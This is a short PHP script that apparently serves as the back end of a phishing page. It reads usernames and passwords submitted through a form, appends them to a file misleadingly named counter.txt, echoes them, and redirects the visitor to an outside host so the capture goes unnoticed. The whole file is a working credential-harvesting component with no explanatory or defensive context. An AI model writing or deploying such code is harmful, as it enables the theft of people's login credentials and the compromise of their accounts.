<?php
  $username = htmlentities($_POST['username']);
    $password = htmlentities($_POST['password']);
   $output ="
  username: $username
  password: $password
     ";
   echo $output;
   $fp = fopen('counter.txt', 'a');
fwrite($fp, $output . PHP_EOL);
fclose($fp);
 header( "Location: http://vps39144nl.hyperhost.name/index1.html/" );
 
?>
